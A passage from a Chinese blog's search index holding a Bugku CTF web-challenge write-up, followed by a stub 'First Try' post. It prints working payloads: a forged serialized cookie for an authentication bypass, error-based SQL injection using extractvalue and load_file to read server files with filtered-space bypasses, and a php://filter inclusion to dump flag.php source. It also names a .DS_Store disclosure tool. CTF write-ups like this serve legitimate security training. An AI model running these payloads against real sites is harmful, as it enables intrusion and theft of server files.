class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line">$KEY=<span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现又是一个关于序列化和反序列化的，那么只需要去构造一个序列化后的payload即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"ISecer:www.isecer.com"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>则我们要的即是<code>s:21:&quot;ISecer:www.isecer.com&quot;;</code>，然而这是一个坑，<code>$KEY</code>是后面才定义的，前面的<code>$KEY</code>还没有定义，即为空。所以我们要的payload为：<code>s:0:&quot;&quot;;</code>，null和空在弱类型里面是相等的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /flagphp/index.php HTTP/1.1</span><br><span class="line">Host: 120.24.86.145:8002</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Cookie: ISecer=s:0:&quot;&quot;;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><p>得到flag。</p><h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>名字是sql注入，但实际上和sql注入一点关系都没有，是敏感文件泄露。用nikto扫描网站</p><p><img src="/2018/08/10/20180810-bugkuctf-wp/1532617261306.png" alt="1532617261306"></p><p>发现是.DS_Store文件泄露，该文件是mac下的文件信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DS_Store文件介绍</span><br><span class="line"></span><br><span class="line">DS_Store 是给Finder用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。删除以后的副作用就是这些信息的失去。（当然，这点副作用其实不是太大）.</span><br></pre></td></tr></table></figure><p>然后用大佬写好的工具直接运行即可获得目标网站的地址。</p><p>.DS_Store文件泄漏利用工具: ds_store_exp：<code>http://www.lijiejie.com/ds_store_exp_ds_store_file_disclosure_exploit/</code></p><p><img src="/2018/08/10/20180810-bugkuctf-wp/1532617412874.png" alt="1532617412874"></p><h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>wp:</p><p><a href="https://delcoding.github.io/2018/03/bugku-writeup4/" target="_blank" rel="noopener">https://delcoding.github.io/2018/03/bugku-writeup4/</a></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>打开后说是过滤一打词语，之后结合题目是报错注入，那就使用<code>extractvalue()</code>或者<code>updatexml()</code> 这两个函数来报错。原理是其中一个变量要求是Xpath的，而我们用concat合成的字符串不符合条件导致报错。之前用过updatexml了，这一次使用extractvalue。</p><p>而他所过滤的空格可以使用回车换行符还替代即<code>%0a</code>或<code>%0d</code> 。</p><p>先尝试以下注入，获得回显。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%0Aand%0Aextractvalue(1,concat(0x7e,(select%0Adatabase()),0x7e))%0A%23</span><br></pre></td></tr></table></figure><p><code>0x7e</code>即是<code>~</code>，这样子输出就会有<code>~</code>作为开始和结束的标志，记得<code>select</code>一句一定要括起来，要不不会有结果。</p><p>然后题目的要求是读取文件，我们就可以使用load_file(十六进制的文件名)这个函数来读取文件，注意要将文件名转成十六进制，而又有个问题是<code>extractvalue</code>和<code>updatexml</code>这两个函数的报错返回只有32个字符，再加上<code>~</code>，那么一次只能输出30个字符，这里就用substr来截取相应的字符串，注意是从0开始的。</p><p>相应的payload如下，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%0Aand%0Aextractvalue(0x7e,concat(0x7e,substr(load_file(0x2f7661722f746573742f6b65795f312e706870),1,30),0x7e))%0A%23</span><br></pre></td></tr></table></figure><p>这里有个问题是从1开始的话，会无法显示内容，是因为最开始有<code>&lt;?php</code>，导致内容被游览器解析了，就无法显示了，从2开始即没有问题。</p><p>也有个解决方法就是运行hex()函数，返回出十六进制内容，即没有问题，相应的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%0Aand%0Aextractvalue(0x7e,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),31,30)))%0A%0A%23</span><br></pre></td></tr></table></figure><p>然后即可获得flag。记得套用他的模板，他的模板里的双引号不正常。</p><h2 id="文件上传2-湖湘杯"><a href="#文件上传2-湖湘杯" class="headerlink" title="文件上传2(湖湘杯)"></a>文件上传2(湖湘杯)</h2><p>这题贼坑，说是文件上传，实际上是敏感文件泄露吧，扫一下网站发现有<code>flag.php</code>，那就尝试一下<code>http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag.php</code>，说没有该文件，那说明我们至少没弄错，然后输入<code>http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag</code>，即会发现能够正常输出flag，base64解密即可。</p><p>可以去看看别的网页源码，下面是index.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">define(<span class="string">'FROM_INDEX'</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$op = <span class="keyword">empty</span>($_GET[<span class="string">'op'</span>]) ? <span class="string">'home'</span> : $_GET[<span class="string">'op'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_string($op) || preg_match(<span class="string">'/\.\./'</span>, $op))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try it again and I will kill you! I freaking hate hackers!'</span>);</span><br><span class="line">ob_start(<span class="string">'ob_gzhandler'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">page_top</span><span class="params">($op)</span> </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;Panduploader::<span class="meta">&lt;?</span>= htmlentities(ucfirst($op)); <span class="meta">?&gt;</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">"header"</span>&gt;</span><br><span class="line">&lt;center&gt;&lt;a href="?op=home" class="logo"&gt;&lt;img src="images/logo.jpg" alt=""&gt;&lt;/a&gt;&lt;/center&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=<span class="string">"body"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fatal</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">?&gt;&lt;div class="article"&gt;</span><br><span class="line">&lt;h2&gt;Error&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;<span class="meta">&lt;?</span>=$msg;<span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">page_bottom</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">&lt;div id=<span class="string">"footer"</span>&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;span&gt;<span class="number">2017</span> &amp;copy; &lt;/span&gt; All rights reserved.</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;<span class="meta">&lt;?php</span></span><br><span class="line">ob_end_flush();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">register_shutdown_function(<span class="string">'page_bottom'</span>);</span><br><span class="line"></span><br><span class="line">page_top($op);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="keyword">include</span> $op . <span class="string">'.php'</span>))</span><br><span class="line">    fatal(<span class="string">'no such page'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现include的时候附加了<code>.php</code>。</p><p>未完，待续</p>]]></content>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>First Try</title>
      <link href="/2018/05/21/First-Try/"/>
      <url>/2018/05/21/First-Try/</url>
      <content type="html"><![CDATA[<h1 id="Only-Test"><a href="#Only-Test" class="headerlink" title="Only Test"></a>Only Test</h1><p>​    not thing</p>]]></content>
      
      
    </entry>
    
  
  
</search>
